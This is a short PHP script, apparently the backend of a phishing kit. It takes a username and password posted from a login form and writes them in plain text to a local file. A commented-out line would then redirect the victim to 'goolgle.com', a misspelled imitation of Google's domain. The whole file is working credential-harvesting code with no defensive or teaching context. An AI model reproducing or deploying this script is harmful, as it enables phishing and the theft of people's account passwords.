<?php
$login = $_POST["usuario"];
$senha = $_POST["senha"];

$consolidado = "Email:  $login - Senha: $senha";
$arquivo = fopen('meu_arquivo.txt', 'w');
if ($arquivo == false)
    die('Não foi possível enviar seu arquivo.');
fwrite($arquivo, $consolidado);
fclose($arquivo);
//header("location: https://www.goolgle.com/");
?>
